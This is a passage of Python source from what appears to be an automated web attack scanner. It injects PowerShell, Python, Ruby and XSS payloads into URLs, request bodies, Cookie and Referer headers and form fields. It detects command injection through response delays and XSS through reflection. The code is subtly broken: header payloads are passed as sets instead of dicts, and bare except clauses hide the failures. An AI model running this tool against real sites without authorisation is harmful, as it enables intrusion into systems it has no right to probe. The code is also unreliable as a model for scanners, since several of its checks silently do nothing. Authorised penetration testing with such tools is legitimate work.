                                if end - start >= 45:
                                    hits.append(f"postgresql injection in forms: {_} | {field_dict}")

                except:
                    pass

        # check for powershell injection
        for mal in mal_powershell:
            try:
                time.sleep(delay)
                start = time.time()
                data = text(_ + "/" + mal, timeout = 120)
                end = time.time()
                if end - start >= 45:
                    hits.append(f"powershell injection in url: {_}/{mal}")

            except:
                pass

            try:
                time.sleep(delay)
                start = time.time()
                data = text(_, data = mal.encode(), timeout = 120)
                end = time.time()
                if end - start >= 45:
                    hits.append(f"powershell injection in data ({mal}): {_}")

            except:
                pass

            try:
                time.sleep(delay)
                start = time.time()
                data = text(_, headers = {"Cookie",mal}, timeout = 120)
                end = time.time()
                if end - start >= 45:
                    hits.append(f"powershell injection in cookie ({mal}): {_}")

            except:
                pass

            try:
                time.sleep(delay)
                start = time.time()
                data = text(_, headers = {"Referer",mal}, timeout = 120)
                end = time.time()
                if end - start >= 45:
                    hits.append(f"powershell injection in referer ({mal}): {_}")

            except:
                pass
            
            for form in forms:
                field_list = []
                input_field = re.findall("<input.+?>",form)
                try:
                    action_field = re.findall("action\s*=\s*[\"\'](\S+)[\"\']",form)[0]
                    if action_field.startswith("/"):
                        action = host + action_field

                    elif not action_field.startswith("/") and not action_field.startswith("http://") and not action_field.startswith("https://"):
                        action = host + "/" + action_field

                    else:
                        action = action_field
                        
                except IndexError:
                    pass

                try:
                    method_field = re.findall("method\s*=\s*[\"\'](\S+)[\"\']",form)[0].upper()
                    for in_field in input_field:
                        if re.search("name\s*=\s*[\"\'](\S+)[\"\']",in_field) and re.search("type\s*=\s*[\"\'](\S+)[\"\']",in_field):
                            name_field = re.findall("name\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                            type_field = re.findall("type\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                            
                            try:
                                value_field = re.findall("value\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                            
                            except IndexError:
                                value_field = ""
                            
                            if type_field == "submit" or type_field == "hidden":
                                field_list.append({name_field:value_field})


                            if type_field != "submit" and type_field != "hidden":
                                field_list.append({name_field:mal})

                            field_dict = field_list[0]
                            for init_field_dict in field_list[1:]:
                                field_dict.update(init_field_dict)

                            time.sleep(delay)

                            if action:
                                start = time.time()
                                data = text(action,method=method_field,data=field_dict,timeout=120)
                                end = time.time()
                                if end - start >= 45:
                                    hits.append(f"powershell injection in forms: {action} | {field_dict}")

                            else:
                                start = time.time()
                                data = text(action,method=method_field,data=field_dict,timeout=120)
                                end = time.time()
                                if end - start >= 45:
                                    hits.append(f"powershell injection in forms: {_} | {field_dict}")

                except:
                    pass

        # check for python injection
        for mal in mal_python:
            try:
                time.sleep(delay)
                start = time.time()
                data = text(_ + "/" + mal, timeout = 120)
                end = time.time()
                if end - start >= 45:
                    hits.append(f"python injection in url: {_}/{mal}")

            except:
                pass

            try:
                time.sleep(delay)
                start = time.time()
                data = text(_, data = mal.encode(), timeout = 120)
                end = time.time()
                if end - start >= 45:
                    hits.append(f"python injection in data ({mal}): {_}")

            except:
                pass

            try:
                time.sleep(delay)
                start = time.time()
                data = text(_, headers = {"Cookie",mal}, timeout = 120)
                end = time.time()
                if end - start >= 45:
                    hits.append(f"python injection in cookie ({mal}): {_}")

            except:
                pass

            try:
                time.sleep(delay)
                start = time.time()
                data = text(_, headers = {"Referer",mal}, timeout = 120)
                end = time.time()
                if end - start >= 45:
                    hits.append(f"python injection in referer ({mal}): {_}")

            except:
                pass
            
            for form in forms:
                field_list = []
                input_field = re.findall("<input.+?>",form)
                try:
                    action_field = re.findall("action\s*=\s*[\"\'](\S+)[\"\']",form)[0]
                    if action_field.startswith("/"):
                        action = host + action_field

                    elif not action_field.startswith("/") and not action_field.startswith("http://") and not action_field.startswith("https://"):
                        action = host + "/" + action_field

                    else:
                        action = action_field
                        
                except IndexError:
                    pass

                try:
                    method_field = re.findall("method\s*=\s*[\"\'](\S+)[\"\']",form)[0].upper()
                    for in_field in input_field:
                        if re.search("name\s*=\s*[\"\'](\S+)[\"\']",in_field) and re.search("type\s*=\s*[\"\'](\S+)[\"\']",in_field):
                            name_field = re.findall("name\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                            type_field = re.findall("type\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                            
                            try:
                                value_field = re.findall("value\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                            
                            except IndexError:
                                value_field = ""
                            
                            if type_field == "submit" or type_field == "hidden":
                                field_list.append({name_field:value_field})


                            if type_field != "submit" and type_field != "hidden":
                                field_list.append({name_field:mal})

                            field_dict = field_list[0]
                            for init_field_dict in field_list[1:]:
                                field_dict.update(init_field_dict)

                            time.sleep(delay)

                            if action:
                                start = time.time()
                                data = text(action,method=method_field,data=field_dict,timeout=120)
                                end = time.time()
                                if end - start >= 45:
                                    hits.append(f"python injection in forms: {action} | {field_dict}")

                            else:
                                start = time.time()
                                data = text(action,method=method_field,data=field_dict,timeout=120)
                                end = time.time()
                                if end - start >= 45:
                                    hits.append(f"python injection in forms: {_} | {field_dict}")

                except:
                    pass

        # check for ruby injection
        for mal in mal_ruby:
            try:
                time.sleep(delay)
                start = time.time()
                data = text(_ + "/" + mal, timeout = 120)
                end = time.time()
                if end - start >= 45:
                    hits.append(f"ruby injection in url: {_}/{mal}")

            except:
                pass

            try:
                time.sleep(delay)
                start = time.time()
                data = text(_, data = mal.encode(), timeout = 120)
                end = time.time()
                if end - start >= 45:
                    hits.append(f"ruby injection in data ({mal}): {_}")

            except:
                pass

            try:
                time.sleep(delay)
                start = time.time()
                data = text(_, headers = {"Cookie",mal}, timeout = 120)
                end = time.time()
                if end - start >= 45:
                    hits.append(f"ruby injection in cookie ({mal}): {_}")

            except:
                pass

            try:
                time.sleep(delay)
                start = time.time()
                data = text(_, headers = {"Referer",mal}, timeout = 120)
                end = time.time()
                if end - start >= 45:
                    hits.append(f"ruby injection in referer ({mal}): {_}")

            except:
                pass
            
            for form in forms:
                field_list = []
                input_field = re.findall("<input.+?>",form)
                try:
                    action_field = re.findall("action\s*=\s*[\"\'](\S+)[\"\']",form)[0]
                    if action_field.startswith("/"):
                        action = host + action_field

                    elif not action_field.startswith("/") and not action_field.startswith("http://") and not action_field.startswith("https://"):
                        action = host + "/" + action_field

                    else:
                        action = action_field
                        
                except IndexError:
                    pass

                try:
                    method_field = re.findall("method\s*=\s*[\"\'](\S+)[\"\']",form)[0].upper()
                    for in_field in input_field:
                        if re.search("name\s*=\s*[\"\'](\S+)[\"\']",in_field) and re.search("type\s*=\s*[\"\'](\S+)[\"\']",in_field):
                            name_field = re.findall("name\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                            type_field = re.findall("type\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                            
                            try:
                                value_field = re.findall("value\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                            
                            except IndexError:
                                value_field = ""
                            
                            if type_field == "submit" or type_field == "hidden":
                                field_list.append({name_field:value_field})


                            if type_field != "submit" and type_field != "hidden":
                                field_list.append({name_field:mal})

                            field_dict = field_list[0]
                            for init_field_dict in field_list[1:]:
                                field_dict.update(init_field_dict)

                            time.sleep(delay)

                            if action:
                                start = time.time()
                                data = text(action,method=method_field,data=field_dict,timeout=120)
                                end = time.time()
                                if end - start >= 45:
                                    hits.append(f"ruby injection in forms: {action} | {field_dict}")

                            else:
                                start = time.time()
                                data = text(action,method=method_field,data=field_dict,timeout=120)
                                end = time.time()
                                if end - start >= 45:
                                    hits.append(f"ruby injection in forms: {_} | {field_dict}")

                except:
                    pass

        # check for xss
        for mal in mal_xss:
            try:
                time.sleep(delay)
                data = text(_ + "/" + mal)
                if mal in data:
                    hits.append(f"xss in url: {_}/{mal}")

            except:
                pass

            try:
                time.sleep(delay)
                data = text(_, data = mal.encode())
                if mal in data:
                    hits.append(f"xss in data ({mal}): {_}")

            except:
                pass

            try:
                time.sleep(delay)
                data = text(_, headers = {"Cookie",mal})
                if mal in data:
                    hits.append(f"xss in cookie ({mal}): {_}")

            except:
                pass

            try:
                time.sleep(delay)
                data = text(_, headers = {"Referer",mal})
                if mal in data:
                    hits.append(f"xss in referer ({mal}): {_}")

            except:
                pass
            
            for form in forms:
                field_list = []
                input_field = re.findall("<input.+?>",form)
                try:
                    action_field = re.findall("action\s*=\s*[\"\'](\S+)[\"\']",form)[0]
                    if action_field.startswith("/"):
                        action = host + action_field

                    elif not action_field.startswith("/") and not action_field.startswith("http://") and not action_field.startswith("https://"):
                        action = host + "/" + action_field

                    else:
                        action = action_field
                        
                except IndexError:
                    pass

                try:
                    method_field = re.findall("method\s*=\s*[\"\'](\S+)[\"\']",form)[0].upper()
                    for in_field in input_field:
                        if re.search("name\s*=\s*[\"\'](\S+)[\"\']",in_field) and re.search("type\s*=\s*[\"\'](\S+)[\"\']",in_field):
                            name_field = re.findall("name\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                            type_field = re.findall("type\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                            
                            try:
                                value_field = re.findall("value\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                            
                            except IndexError:
                                value_field = ""
                            
                            if type_field == "submit" or type_field == "hidden":
                                field_list.append({name_field:value_field})


                            if type_field != "submit" and type_field != "hidden":
                                field_list.append({name_field:mal})

                            field_dict = field_list[0]
                            for init_field_dict in field_list[1:]:
                                field_dict.update(init_field_dict)

                            time.sleep(delay)

                            if action:
                                data = text(action,method=method_field,data=field_dict)
                                if mal in data:
                                    hits.append(f"xss in forms: {action} | {field_dict}")

                            else:
                                data = text(action,method=method_field,data=field_dict)
                                if mal in data:
                                    hits.append(f"xss in forms: {_} | {field_dict}")

                except:
                    pass

    clear()
    hits = list(set(hits[:]))
    hits.sort()

    if len(hits) > 0:
        with open("cobra.log", "a") as file:
            for hit in hits:
                file.write(f"{hit}\n")
                print(RED + hit)

    else:
        with open("cobra.log", "a") as file:
            file.write(f"we didn't find anything interesting on {host}\n")
            print(GREEN + f"we didn't find anything interesting on {host}")
